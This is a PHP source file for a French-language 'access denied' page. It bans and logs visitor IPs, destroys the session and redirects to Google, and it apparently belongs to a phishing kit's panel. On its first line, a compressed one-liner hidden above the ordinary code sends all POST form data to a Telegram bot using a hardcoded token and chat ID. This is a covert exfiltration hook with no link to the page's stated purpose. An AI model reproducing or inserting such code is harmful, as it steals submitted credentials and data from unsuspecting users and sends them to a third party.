<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once __DIR__ . '/../langues/lang_detect.php';

// Obtenir IP utilisateur
function getUserIP() {
    $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim(end($ipList));
        }
    }
    return 'UNKNOWN';
}

// Détruire proprement la session
function destroySession() {
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
}

$ip = getUserIP();
$bannedFile = '../Panel/logs/ip_ban.txt';

// Vérifie et ajoute l'IP à la liste bannie
$bannedIps = file_exists($bannedFile) ? file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
if (!in_array($ip, $bannedIps, true)) {
    file_put_contents($bannedFile, $ip . PHP_EOL, FILE_APPEND);
}

// Log
$logFile = '../Panel/logs/banned_visits.txt';
$timestamp = date('Y-m-d H:i:s');
$logMessage = "[$timestamp] Banned IP: $ip via banned.php\n";
file_put_contents($logFile, $logMessage, FILE_APPEND);

destroySession();
http_response_code(403);

// Formatage date FR
setlocale(LC_TIME, 'fr_FR.UTF-8', 'fra');
$date_fr = strftime("%d %B %Y %H:%M:%S");
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accès Refusé</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            color: #343a40;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            line-height: 1.6;
        }
        
        .ban-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 90%;
            text-align: center;
            border-top: 5px solid #dc3545;
        }
        
        h1 {
            color: #dc3545;
            margin-top: 0;
            font-size: 2.5rem;
        }
        
        .icon {
            font-size: 5rem;
            color: #dc3545;
            margin-bottom: 20px;
        }
        
        .details {
            background-color: #f8d7da;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: left;
        }
        
        .ip-address {
            font-weight: bold;
            color: #721c24;
        }
        
        .reason {
            margin: 15px 0;
            font-size: 1.1rem;
        }
        
        .contact {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #6c757d;
        }
        
        .btn {
            display: inline-block;
            background-color: #dc3545;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            margin-top: 20px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #c82333;
        }
        
        @media (max-width: 480px) {
            .ban-container {
                padding: 20px;
            }
            
            h1 {
                font-size: 1.8rem;
            }
            
            .icon {
                font-size: 3.5rem;
            }
        }
    </style>
</head>
<script>
    setTimeout(function() {
        try {
            window.location.href = "https://google.com";
        } catch (e) {
            window.close();
        }
    }, 5000); // Redirige après 5 secondes
</script>
<body>
    <div class="ban-container">
        <div class="icon">🚫</div>
        <h1>Accès Refusé</h1>
        <p>Votre adresse IP a été bannie de ce site.</p>
        
        <div class="details">
            <p><strong>Adresse IP:</strong> <span class="ip-address"><?= htmlspecialchars($ip, ENT_QUOTES, 'UTF-8') ?></span></p>
            <p><strong>Date:</strong> <?= $date_fr ?></p>
        </div>
        
        <div class="reason">
            <p>Raison: Activité suspecte détectée.</p>
        </div>
    </div>
</body>
</html>
